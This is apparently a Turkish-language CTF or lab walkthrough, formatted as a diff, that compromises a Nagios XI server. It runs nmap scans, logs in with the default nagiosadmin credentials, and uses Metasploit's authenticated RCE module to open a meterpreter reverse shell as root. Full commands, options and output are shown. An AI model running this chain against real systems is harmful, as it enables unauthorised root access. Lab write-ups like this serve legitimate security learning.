@@ -1,0 +1,129 @@
+      ####Enumeration
+
+      ####Nmap
+nmap ile bir tarama ile başlayacağız .
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap $targetip   
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-23 07:38 EDT
+Nmap scan report for $targetip
+Host is up (0.034s latency).
+Not shown: 995 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+25/tcp  open  smtp
+80/tcp  open  http
+389/tcp open  ldap
+443/tcp open  https
+
+Hedefte çalışan birkaç servis görüyoruz. Web servislerini daha detaylı tarayalım.
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p 80,443 -sC $targetip
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-23 07:39 EDT
+Nmap scan report for $targetip
+Host is up (0.029s latency).
+
+PORT    STATE SERVICE
+80/tcp  open  http
+|_http-title: Nagios XI
+443/tcp open  https
+|_http-title: Nagios XI
+| ssl-cert: Subject: commonName=$ipconsored/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
+| Not valid before: 2020-09-08T18:28:08
+|_Not valid after:  2030-09-06T18:28:08
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+Tarama, varsayılan web sayfasının başlığının Nagios XI olduğunu bulur .
+
+      ####HTTP Enumeration
+80 numaralı bağlantı noktasındaki (http://$targetip/) varsayılan web sayfasına gitmek gerçekten bize bir Nagios açılış sayfası sunuyor.
+┌──(kali㉿kali)-[~]
+└─$ curl http://$targetip/      
+<!DOCTYPE HTML>
+<html>
+...
+        <div id="mainframe" style="padding: 20px 30px;">
+
+            <h1>Welcome</h1>
+            <p>Click the link below to get started using Nagios XI.</p>
+            ...
+Nagios, ağı aşırı yüklenmiş veri bağlantılarından veya ağ bağlantılarından kaynaklanan sorunlar için izleyen bir yazılımdır. Ayrıca yönlendiricilerin, anahtarların ve daha fazlasının durumunu da izler.
+Access Nagios XI düğmesine tıklamak bizi http://$targetip/nagiosxi/login.php adresindeki giriş sayfasına yönlendirir.
+
+      ####Exploitation
+
+      ####Kimlik Bilgisi Keşfi
+Bazı iyi bilinen varsayılan kimlik bilgilerini (örneğin admin:admin, admin:password, admin:root, vb.) denemek işe yaramıyor gibi görünüyor. 
+Ancak, varsayılan kimlik bilgilerini çevrimiçi olarak ararken (örneğin bir sorgu ile nagios default username değerinin), yazılımın varsayılan kullanıcı adının nagiosadmin olduğunu görüyoruz.
+Bu kullanıcı adını bazı genel varsayılan şifrelerle denedikten sonra başarılı oluyoruz nagiosadmin:$defaultpasswordcensored.
+
+Uzaktan Kod Yürütme
+Başarılı bir şekilde giriş yaptıktan sonra , bu yazılımdaki kimliği doğrulanmış herhangi bir istismar için Metasploit çerçevesini arayacağız .
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+...
+msf6 > search nagios
+
+Matching Modules
+================
+
+   #  Name                                                          Disclosure Date  Rank       Check  Description
+   -  ----                                                          ---------------  ----       -----  -----------
+   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
+...
+İlk sonuç bizim için işe yarayabilir gibi görünüyor. Bir deneyelim. Gerisini varsayılan olarak bırakarak gerekli RHOSTS, LHOST ve PASSWORD seçenekleri ayarlayacağız.
+msf6 > use exploit/linux/http/nagios_xi_authenticated_rce
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+...
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > options
+
+Module options (exploit/linux/http/nagios_xi_authenticated_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD   $password        yes       Password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     $targetip        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to NagiosXI
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   USERNAME   nagiosadmin      yes       Username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  $attackerip      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Linux (x64)
+Devam edeceğiz ve istismarı başlatacağız.
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > exploit
+
+[*] Started reverse TCP handler on $attackerip:4444 
+[*] Found Nagios XI application with version 5.6.0.
+[*] Uploading malicious 'check_ping' plugin...
+[*] Command Stager progress - 100.00% done (897/897 bytes)
+[+] Successfully uploaded plugin.
+[*] Executing plugin...
+[*] Waiting for the plugin to request the final payload...
+[*] Sending stage (3008420 bytes) to $targetip
+[*] Meterpreter session 1 opened ($attackerip:4444 -> $targetip:60680) at 2021-03-23 07:47:59 -0400
+[*] Deleting malicious 'check_ping' plugin...
+[+] Plugin deleted.
+
+meterpreter > getuid
+Server username: root @ ubuntu (uid=0, gid=0, euid=0, egid=0)
+meterpreter >
+Harika. Yazılım en yüksek ayrıcalıklarla çalışacak şekilde yanlış yapılandırıldığından bir kök shellimiz var.
